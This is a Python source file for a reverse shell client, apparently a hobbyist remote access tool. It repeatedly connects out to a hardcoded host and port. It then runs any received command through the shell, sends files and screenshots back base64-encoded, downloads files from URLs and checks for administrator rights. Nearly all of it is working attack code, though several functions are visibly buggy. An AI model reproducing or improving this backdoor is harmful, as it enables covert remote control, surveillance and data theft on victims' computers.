import socket
import subprocess
import json
import os
import time
import platform
import base64
import requests
from mss import mss
import pickle


'''
rsq -> QUIT
rqhelp -> See reverse shell help
'''


REMOTE_HOST = '127.0.0.1' # '192.168.43.82'
REMOTE_PORT = 8081 # 2222
client = socket.socket()

# CONNECT TO SERVER
# -----------------------------------
def connect_to_server():
    while True:
        time.sleep(1)
        try:
            # print("+ Initiating Connection")
            client.connect((REMOTE_HOST, REMOTE_PORT))
            print("+ Connected to server")
            shell()
        except:
            print(f'- Unable to connect to the server')
            connect_to_server()

# RELIABLE SEND
# -----------------------------------
def send(data):
    # WORKING
    # -----------------------------------
    try:
        data = data.encode()
    except AttributeError:
        pass
    client.send(data)

    # TRY 2
    # -----------------------------------
    # msg = pickle.dumps(data)
    # client.send(msg)

    # WANTED TO MAKE IT BETTER AND FAILED
    # -----------------------------------
    # jd = json.dumps(data)
    # client.send(jd.encode())

# RELIABLE RECIEVE
# -----------------------------------
def recv():
    # WORKING
    # -----------------------------------
    output = client.recv(16834)
    output = output.decode()
    return output

    # TRY 2
    # -----------------------------------
    # jrd = ""
    # while True:
    #     try:
    #         jrd = jrd + pickle.loads(client.recv(16834))
    #         return jrd
    #     except:
    #         continue

    # WANTED TO MAKE IT BETTER AND FAILED
    # -----------------------------------
    # jrd = b""
    # while True:
    #     try:
    #         jrd = jrd + client.recv(1024)
    #         return json.loads(jrd)
    #     except ValueError:
    #         break

# DOWNLOAD FILES FROM INTERNET
# -----------------------------------
def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

# TAKE SCREEN SHOT
# -----------------------------------
def screenshot():
    with mss() as screenshot:
        screenshot.shot()

# CHECK ADMIN PRIVILIAGES
# -----------------------------------
def is_admin():
    global admin
    try:
        temp = os.listdir(os.sep.join([os.environ('SystemRoot','C;\\Windows'), 'temp']))
    except:
        admin="User Privilaes"
    else:
        admin="Administrator Privilaes"

# SHELL CLIENT
# -----------------------------------
def shell():
    while True:
        command = recv()
        print(f'Command Recieved: {command}')

        if command == "rsq":
            break

        elif command == "rshelp":
            try:
                help_cmd = '''
        rsq -> QUIT
        rqhelp -> See reverse shell help
                '''
                send(help_cmd)
            except:
                pass
        
        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        
        elif command[:8] == "download":
            with open(command[:9], "rb") as file:
                send(base64.b64encode(file.read()))
        
        elif command[:6] == "upload":
            with open(command[7:], "rb") as fin:
                result = recv()
                fin.write(base64.b64decode(result))
        
        elif command[:3] == "get":
            try:
                download(command[4:])
                send("+ Downloaded file from specified URL! ")
            except:
                send("- Failed to download file")
        
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                send("[!!] Started")
            except:
                send("[!!] Started")
        
        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png", "rb") as sc:
                    send(base64.b64encode(sc.read()))
                os.remove("monitor-1.png")
            except:
                send("[!!] Failed to take a screenshot")
        
        elif command[:5] == "check":
            try:
                is_admin()
                send(admin)
            except:
                send("[!!] Cant perform the Check!")
        
        else:
            proc = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            print("[-] Sending response...")
            result = proc.stdout.read() + proc.stderr.read()
            print(result)
            send(result)


connect_to_server()
# shell()